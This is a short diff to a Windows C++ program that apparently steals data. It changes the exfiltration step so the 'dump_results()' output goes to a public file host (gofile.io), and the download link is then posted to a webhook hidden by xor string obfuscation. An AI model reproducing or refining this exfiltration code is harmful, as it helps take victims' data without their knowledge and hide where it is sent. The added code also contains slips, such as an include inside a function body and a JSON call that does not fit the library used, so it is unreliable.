@@ -86,21 +86,42 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 
 #ifdef WEBHOOK
 #define BOUNDARY "----WebKitFormBoundary7MA4YWxkTrZu0gW"
-  try {
-    std::stringstream ss;
-    ss << "--" BOUNDARY "\r\n";
-    ss << xor("Content-Disposition: form-data; name=\"file\"; filename=\"dump.txt\"\r\n");
-    ss << xor("Content-Type: text/plain\r\n\r\n");
-    ss << dump_results() << "\r\n";
-    ss << "--" BOUNDARY "--\r\n";
+#include <nlohmann/json.hpp>
 
-    HTTP::post(xor(WEBHOOK), ss.str(),
-               {
-                   {xor("Content-Type"), "multipart/form-data; boundary=" BOUNDARY}});
-  } catch (const HTTPException &e) {
+try {
+
+    std::stringstream file_stream;
+    file_stream << dump_results();
+    std::string dump_data = file_stream.str();
+  
+    auto gofile_res = HTTP::post("https://api.gofile.io/uploadFile", dump_data, {
+        {xor("Content-Type"), "application/octet-stream"},
+        {xor("Content-Disposition"), "form-data; name=\"file\"; filename=\"dump.txt\""}
+    });
+
+    if (gofile_res.status_code == 200) {
+
+        auto gofile_json = gofile_res.json();
+        std::string download_link = gofile_json["data"]["downloadPage"].as<std::string>();
+
+
+        std::stringstream ss;
+        ss << "--" BOUNDARY "\r\n";
+        ss << xor("Content-Disposition: form-data; name=\"content\"\r\n\r\n");
+        ss << "Dump file uploaded to GoFile: " << download_link << "\r\n";
+        ss << "--" BOUNDARY "--\r\n";
+
+        HTTP::post(xor(WEBHOOK), ss.str(), {
+            {xor("Content-Type"), "multipart/form-data; boundary=" BOUNDARY}
+        });
+    } else {
+        PRINTF("Failed to upload to GoFile\n");
+    }
+} catch (const HTTPException &e) {
     PRINTF("Failed to send results: %s\n", e.what());
-  }
+}
 #endif
+
 
   return 0;
 }
